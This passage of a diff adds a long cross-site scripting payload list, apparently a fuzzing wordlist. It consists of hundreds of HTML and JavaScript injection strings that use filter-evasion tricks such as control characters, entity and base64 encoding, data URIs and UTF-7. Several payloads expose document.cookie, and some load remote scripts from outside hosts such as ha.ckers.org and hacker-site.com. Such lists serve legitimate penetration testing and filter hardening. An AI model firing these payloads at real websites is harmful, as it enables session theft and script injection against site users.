+<IMG SRC=x onstalled="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsuspend="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontimeupdate="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="prompt(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="prompt(String.fromCharCode(88,83,83))">
+<INPUT TYPE="BUTTON" action="prompt('XSS')"/>
+"><h1><IFRAME SRC="javascript:prompt('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+<IFRAME SRC="javascript:prompt('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>
+"><h1><IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+"></iframe><script>prompt(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+<IFRAME width="420" height="315" frameborder="0" onload="prompt(document.cookie)"></IFRAME>
+"><h1><IFRAME SRC="javascript:prompt('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>123</h1>
+<iframe src=http://xss.rocks/scriptlet.html <
+<IFRAME SRC="javascript:prompt('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="prompt(document.cookie)"></IFRAME>
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<script src="data:text/javascript,prompt(1)"></script>
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=prompt(1)
+<svg/onload=prompt(1)
+<input value=<><iframe/src=javascript:confirm(1)
+<script>+-+-1-+-+prompt(1)</script>
+<body/onload=&lt;!--&gt;&#10prompt(1)>
+<script itworksinallbrowsers>/*<script* */prompt(1)</script
+<img src ?itworksonchrome?\/onerror = prompt(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> prompt(1)
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<script x> prompt(1) </script 1=2
+<div/onmouseover='prompt(1)'> style="x:">
+<--`<img/src=` onerror=prompt(1)> --!>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="prompt(1)">x</button>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<form><button formaction=javascript&colon;prompt(1)>CLICKME
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<body onload body onload="javascript:javascript:prompt(1)"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:prompt(1)"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:prompt(1)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:prompt(1)"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:prompt(1)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:prompt(1)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:prompt(1)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:prompt(1)"></iframe src>
+<svg onload svg onload="javascript:javascript:prompt(1)"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:prompt(1)"></html onmousemove>
+<body onblur body onblur="javascript:javascript:prompt(1)"></body onblur>
+\x3Cscript>javascript:prompt(1)</script>
+'"`><script>/* *\x2Fjavascript:prompt(1)// */</script>
+<script>javascript:prompt(1)</script\x0D
+<script>javascript:prompt(1)</script\x0A
+<script>javascript:prompt(1)</script\x0B
+<script charset="\x22>javascript:prompt(1)</script>
+<a href="javas\x03cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:prompt(1)// */</script>
+<script>/* *\x00/javascript:prompt(1)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:prompt(1)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:prompt(1)//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:prompt(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:prompt(1);/*';">DEF 
+<script>if("x\\xE1\x96\x89".length==2) { javascript:prompt(1);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:prompt(1);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:prompt(1);}</script>
+'`"><\x3Cscript>javascript:prompt(1)</script>
+'`"><\x00script>javascript:prompt(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:prompt(1)>
+"'`><\x00img src=xxx:x onerror=javascript:prompt(1)>
+<script src="data:text/plain\x2Cjavascript:prompt(1)"></script>
+<script src="data:\xD4\x8F,javascript:prompt(1)"></script>
+<script src="data:\xE0\xA4\x98,javascript:prompt(1)"></script>
+<script src="data:\xCB\x8F,javascript:prompt(1)"></script>
+<script\x20type="text/javascript">javascript:prompt(1);</script>
+<script\x3Etype="text/javascript">javascript:prompt(1);</script>
+<script\x0Dtype="text/javascript">javascript:prompt(1);</script>
+<script\x09type="text/javascript">javascript:prompt(1);</script>
+<script\x0Ctype="text/javascript">javascript:prompt(1);</script>
+<script\x2Ftype="text/javascript">javascript:prompt(1);</script>
+<script\x0Atype="text/javascript">javascript:prompt(1);</script>
+<a href="\xE2\x80\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x17javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x03javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Ejavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x00javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x10javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x82javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x20javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x13javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x09javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x14javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x19javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Fjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x81javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x87javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x07javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x83javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x04javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x01javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x84javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x86javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE3\x80\x80javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x12javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Djavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Ajavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x0Cjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x15javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x16javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x02javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Bjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x06javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x80\x85javascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Ejavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="\x1Cjavascript:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:prompt(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:prompt(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x22onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Bonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Donerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x2Fonerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x09onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x0Conerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x00onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x27onerror=javascript:prompt(1)>
+`"'><img src=xxx:x \x20onerror=javascript:prompt(1)>
+"`'><script>\x3Bjavascript:prompt(1)</script>
+"`'><script>\x0Djavascript:prompt(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x81javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x84javascript:prompt(1)</script>
+"`'><script>\xE3\x80\x80javascript:prompt(1)</script>
+"`'><script>\x09javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x89javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x85javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x88javascript:prompt(1)</script>
+"`'><script>\x00javascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA8javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:prompt(1)</script>
+"`'><script>\xE1\x9A\x80javascript:prompt(1)</script>
+"`'><script>\x0Cjavascript:prompt(1)</script>
+"`'><script>\x2Bjavascript:prompt(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:prompt(1)</script>
+"`'><script>-javascript:prompt(1)</script>
+"`'><script>\x0Ajavascript:prompt(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:prompt(1)</script>
+"`'><script>\x7Ejavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x87javascript:prompt(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA9javascript:prompt(1)</script>
+"`'><script>\xC2\x85javascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x83javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x80javascript:prompt(1)</script>
+"`'><script>\x21javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x82javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x86javascript:prompt(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:prompt(1)</script>
+"`'><script>\x0Bjavascript:prompt(1)</script>
+"`'><script>\x20javascript:prompt(1)</script>
+"`'><script>\xC2\xA0javascript:prompt(1)</script>
+`"'><img src=xxx:x onerror\x09=javascript:prompt(1)>
+<script>javascript:prompt(1)<\x00/script>
+<img src=# onerror\x3D"javascript:prompt(1)" >
+<input onfocus=javascript:prompt(1) autofocus>
+<input onblur=javascript:prompt(1) autofocus><input autofocus>
+<form id=test onforminput=javascript:prompt(1)><input></form><button form=test onformchange=javascript:prompt(1)>X
+<video><source onerror="javascript:javascript:prompt(1)">
+<video onerror="javascript:javascript:prompt(1)"><source>
+<form><button formaction="javascript:javascript:prompt(1)">X
+<body oninput=javascript:prompt(1)><input autofocus>
+<math href="javascript:javascript:prompt(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:prompt(1)">CLICKME</maction> </math>
+<frameset onload=javascript:prompt(1)>
+<table background="javascript:javascript:prompt(1)">
+<!--<img src="--><img src=x onerror=javascript:prompt(1)//">
+<embed src="javascript:prompt(1)">
+<img src="javascript:prompt(1)">
+<image src="javascript:prompt(1)">
+<script src="javascript:prompt(1)">
+<div style=width:1px;filter:glow onfilterchange=javascript:prompt(1)>x
+<? foo="><script>javascript:prompt(1)</script>">
+<! foo="><script>javascript:prompt(1)</script>">
+</ foo="><script>javascript:prompt(1)</script>">
+<? foo="><x foo='?><script>javascript:prompt(1)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:prompt(1)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:prompt(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x47src=x onerror="javascript:prompt(1)">
+<img \x11src=x onerror="javascript:prompt(1)">
+<img \x12src=x onerror="javascript:prompt(1)">
+<img\x47src=x onerror="javascript:prompt(1)">
+<img\x10src=x onerror="javascript:prompt(1)">
+<img\x13src=x onerror="javascript:prompt(1)">
+<img\x32src=x onerror="javascript:prompt(1)">
+<img\x47src=x onerror="javascript:prompt(1)">
+<img\x11src=x onerror="javascript:prompt(1)">
+<img \x47src=x onerror="javascript:prompt(1)">
+<img \x34src=x onerror="javascript:prompt(1)">
+<img \x39src=x onerror="javascript:prompt(1)">
+<img \x00src=x onerror="javascript:prompt(1)">
+<img src\x09=x onerror="javascript:prompt(1)">
+<img src\x10=x onerror="javascript:prompt(1)">
+<img src\x13=x onerror="javascript:prompt(1)">
+<img src\x32=x onerror="javascript:prompt(1)">
+<img src\x12=x onerror="javascript:prompt(1)">
+<img src\x11=x onerror="javascript:prompt(1)">
+<img src\x00=x onerror="javascript:prompt(1)">
+<img src\x47=x onerror="javascript:prompt(1)">
+<img src=x\x09onerror="javascript:prompt(1)">
+<img src=x\x10onerror="javascript:prompt(1)">
+<img src=x\x11onerror="javascript:prompt(1)">
+<img src=x\x12onerror="javascript:prompt(1)">
+<img src=x\x13onerror="javascript:prompt(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"prompt(1)">
+<img src=x onerror=\x09"javascript:prompt(1)">
+<img src=x onerror=\x10"javascript:prompt(1)">
+<img src=x onerror=\x11"javascript:prompt(1)">
+<img src=x onerror=\x12"javascript:prompt(1)">
+<img src=x onerror=\x32"javascript:prompt(1)">
+<img src=x onerror=\x00"javascript:prompt(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:prompt(1)>XXX</a>
+<img src="x` `<script>javascript:prompt(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:prompt(1)//">
+<title onpropertychange=javascript:prompt(1)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:prompt(1)></a>">
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<IMG SRC="javascript:javascript:prompt(1)"
+<iframe src=%(scriptlet)s <
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:prompt(1);">
+<IMG DYNSRC="javascript:javascript:prompt(1)">
+<IMG LOWSRC="javascript:javascript:prompt(1)">
+<embed code=%(scriptlet)s></embed>
+<embed code=javascript:javascript:prompt(1);></embed>
+<embed src=%(jscript)s></embed>
+<frameset onload=javascript:javascript:prompt(1)></frameset>
+<object onerror=javascript:javascript:prompt(1)>
+<embed type="image" src=%(scriptlet)s></embed>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:prompt(1);">]]</C><X></xml>
+<IMG SRC=&{javascript:prompt(1);};>
+<a href="jav&#65ascript:javascript:prompt(1)">test1</a>
+<a href="jav&#97ascript:javascript:prompt(1)">test1</a>
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:prompt(1)&amp;gt;>">
+';prompt(String.fromCharCode(88,83,83))//';prompt(String.fromCharCode(88,83,83))//";
+prompt(String.fromCharCode(88,83,83))//";prompt(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:prompt('XSS');">
+<IMG SRC=javascript:prompt('XSS')>
+<IMG SRC=JaVaScRiPt:prompt('XSS')>
+<IMG SRC=javascript:prompt("XSS")>
+<IMG SRC=`javascript:prompt("RSnake says, 'XSS'")`>
+<a onmouseover="prompt(document.cookie)">xxs link</a>
+<a onmouseover=prompt(document.cookie)>xxs link</a>
+<IMG """><SCRIPT>prompt("XSS")</SCRIPT>">
+<IMG SRC=javascript:prompt(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="prompt('xxs')">
+<IMG SRC= onmouseover="prompt('xxs')">
+<IMG onmouseover="prompt('xxs')">
+<IMG SRC="jav&#x09;ascript:prompt('XSS');">
+<IMG SRC="jav&#x0A;ascript:prompt('XSS');">
+<IMG SRC="jav&#x0D;ascript:prompt('XSS');">
+<IMG SRC=" &#14;  javascript:prompt('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=prompt("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>prompt("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:prompt('XSS')"
+<iframe src=http://ha.ckers.org/scriptlet.html <
+\";prompt('XSS');//
+</TITLE><SCRIPT>prompt("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:prompt('XSS');">
+"><script>prompt("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>prompt("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>prompt("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+<script>prompt(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>prompt(1337)</script>"><script>prompt("XSS by \nxss</h1></marquee>
+'"></title><script>prompt(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+<iframe src="javascript:prompt('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
+'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+"><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+\'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+'); prompt('xss'); var x='
+\\'); prompt(\'xss\');var x=\'
+//--></SCRIPT><SCRIPT>prompt(String.fromCharCode(88,83,83));
+>"><ScRiPt%20%0a%0d>prompt(561177485777)%3B</ScRiPt>
+<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
+<SCRIPT> prompt(“XSS”); </SCRIPT>
+<BODY ONLOAD=prompt("XSS")>
+<BODY BACKGROUND="javascript:prompt('XSS')">
+<IMG SRC="javascript:prompt('XSS');">
+<IMG DYNSRC="javascript:prompt('XSS')">
+<IMG LOWSRC="javascript:prompt('XSS')">
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<INPUT TYPE="IMAGE" SRC="javascript:prompt('XSS');">
+<LINK REL="stylesheet" HREF="javascript:prompt('XSS');">
+<TABLE BACKGROUND="javascript:prompt('XSS')">
+<TD BACKGROUND="javascript:prompt('XSS')">
+<DIV STYLE="background-image: url(javascript:prompt('XSS'))">
+<DIV STYLE="width: expression(prompt('XSS'));">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
+<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
+<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+\";document.vulnerable=true;;//
+</title><SCRIPT>document.vulnerable=true;</script>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+<img DYNSRC="javascript:document.vulnerable=true;">
+<img LOWSRC="javascript:document.vulnerable=true;">
+<bgsound SRC="javascript:document.vulnerable=true;">
+<br SIZE="&{document.vulnerable=true}">
+<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+<img SRC='vbscript:document.vulnerable=true;'>
+1script3document.vulnerable=true;1/script3
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+<table BACKGROUND="javascript:document.vulnerable=true;">
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
+<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
+<div STYLE="width: expression(document.vulnerable=true);">
+<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
+<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=�jav ascript:alert(�XSS�);�>
+<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>
+<<SCRIPT>alert(�XSS�);//<</SCRIPT>
+%253cscript%253ealert(1)%253c/script%253e
+�><s�%2b�cript>alert(document.cookie)</script>
+foo<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<BODY ONLOAD=alert(�XSS�)>
+<INPUT TYPE=�IMAGE� SRC=�javascript:alert(�XSS�);�>
+<IMG SRC=�javascript:alert(�XSS�)�
+<iframe src=http://ha.ckers.org/scriptlet.html <
+javascript:alert("hellox worldss")
+<img src="javascript:alert('XSS');">
+<img src=javascript:alert(&quot;XSS&quot;)>
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<form id="test" /><button form="test" formaction="javascript:confirm(123)">TESTHTML5FORMACTION
+<form><button formaction="javascript:confirm(123)">crosssitespt
+<frameset onload=confirm(123)>
+<!--<img src="--><img src=x onerror=confirm(123)//">
+<style><img src="</style><img src=x onerror=confirm(123)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:confirm(1)">
+<? foo="><script>confirm(1)</script>">
+<! foo="><script>confirm(1)</script>">
+</ foo="><script>confirm(1)</script>">
+<script>({0:#0=confirm/#0#/#0#(123)})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){confirm(123)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('confirm(1)')()</script>
+<script src="#">{confirm(1)}</script>;1
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'confirm(1)',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>confirm(1)</script></svg>
+<svg onload="javascript:confirm(123)" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:confirm(1)"></iframe>
++ADw-script+AD4-confirm(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-confirm(document.location)%2BADw-/script%2BAD4-
